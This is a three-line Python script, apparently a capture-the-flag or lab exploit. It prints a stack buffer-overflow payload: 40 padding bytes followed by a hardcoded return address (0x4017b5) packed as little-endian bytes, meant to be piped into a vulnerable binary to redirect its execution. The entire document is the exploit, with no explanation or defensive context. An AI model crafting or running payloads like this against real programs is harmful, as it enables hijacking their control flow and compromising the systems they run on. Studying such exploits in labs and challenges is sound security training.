import sys
sys.stdout.buffer.write(b'A'*40)
sys.stdout.buffer.write(0x4017b5.to_bytes(8, 'little'))
